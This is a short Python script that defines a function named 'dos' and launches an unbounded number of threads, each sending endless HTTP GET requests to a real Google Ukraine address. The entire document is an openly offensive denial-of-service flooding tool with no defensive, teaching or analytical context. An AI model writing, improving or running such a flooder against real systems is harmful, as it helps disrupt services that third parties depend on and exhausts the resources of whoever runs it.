import threading
import requests


def dos():
    while True:
        requests.get("https://www.google.com.ua/")


while True:
    threading.Thread(target=dos).start()
